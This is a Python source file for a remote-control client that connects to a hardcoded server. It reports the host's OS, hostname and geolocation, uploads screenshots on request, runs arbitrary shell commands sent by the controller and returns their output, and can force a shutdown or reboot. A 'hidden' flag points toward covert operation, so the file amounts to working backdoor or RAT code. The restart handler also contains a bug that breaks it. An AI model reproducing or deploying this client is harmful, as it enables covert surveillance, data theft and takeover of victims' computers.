import socketio
import platform
import requests
import os
from mss import mss as screenmgr
import subprocess
from socket import gethostname
from time import sleep

hidden = False # Temporary

io = socketio.Client();
client_data = {}

def close():
    io.disconnect()
    exit()

@io.event
def connect():
    # Send data, as message: init
    global client_data
    geo_r = requests.get("http://ip-api.com/json/")
    geodata = geo_r.json()

    client_data = {
        "type":"node",
        "os":platform.system(),
        "os_release":platform.release(),
        "geolocation":geodata,
        "name":gethostname(),

    }

    io.emit('init', client_data)

@io.event
def kill_switch(data):
    print('Kill switch activated. Shutting down in ' + str(data["timer"]) + ' seconds...')
    sleep(data["timer"])
    close()

@io.event
def shutdown(data):
    print('Shutdown activated. Shutting down in ' + str(data["timer"]) + " seconds...")
    sleep(data["timer"])
    # Begin Shutdown Process:

    # Check OS Type
    # Try with and without sudo. Do both.
    if client_data['os'].lower() == "linux":
        os.system("shutdown now")
        os.system("sudo shutdown now")

    elif client_data['os'].lower() == "windows":
        os.system("shutdown /s /t 0")

    elif client_data['os'].lower() == "darwin":
        os.system("shutdown -r now")
        os.system("sudo shutdown -h now")

@io.event
def restart(data):
    print('Restart activated. Restarting in ' + str(data["timer"]) + " seconds...")
    sleep(data["timer"])
    # Begin Shutdown Process:

    # Check OS Type
    # Try with and without sudo. Do both.
    if client_data.os.lower() == "linux":
        os.system("reboot")
        os.system("sudo reboot")

    elif client_data.os.lower() == "windows":
        os.system("shutdown /r /t 0")

    elif client_data.os.lower() == "darwin":
        os.system("shutdown -r now")
        os.system("sudo shutdown -r now")

@io.event
def screenshot(data):
    print("Received screenshot request!")
    # Take the screenshot and save it in running directory
    screenshot_filenames = []
    for file in screenmgr().save():
        screenshot_filenames.append(file)

    for i, fn in enumerate(screenshot_filenames):
        # Change to bytes and send
        with open(fn, "rb") as currentSC:
            fileRaw = currentSC.read()
            # Send it
            io.emit("node:screenshot", {
                "admin":data['admin'],
                "raw_file":fileRaw,
                "base_filename":fn
            })

        os.remove(fn)






    # filename_prefix = client_data['name'] + '-{%Y%m%d-%H%M%S}'.format(date=datetime.datetime.now())

    #
    # for fn in screenshot_filenames:
    #     os.rename(fn, filename_prefix + fn)
    #
    # screenshot_filenames

@io.event
def run_command(data):
    # os.system(command)
    command = data['command']

    # try:
    #     output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, check=True).stdout.decode('utf-8')
    # except subprocess.CalledProcessError as e:
    #
    #     output = "\nNode: " + client_data['name'] + " - An error occurred, and the command did not run.\n"

    # os.system(command)

    # if not hidden:
    #     out = os.popen(command).read()
    #
    # else:
    #     out = "Unable to read output... is the client hidden?"
    #     os.system(command)

    command_split = command.split(" ")

    p = subprocess.Popen(command_split, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    out, err = p.communicate()
    result = out.decode() if out else err.decode()


    io.emit("client:console_output", {
        'output':result,
        'adminID':data['adminID']
    })

    # io.emit("client:console_output", {
    #     'output':output,
    #     'adminID':data['adminID']
    # })
    # Add extra options to make it work.

try:
    io.connect("http://jz-software.pw:1010")
except:
    print("Failed to connect to server. Shutting down in 3 seconds...")
    sleep(3)
    exit()
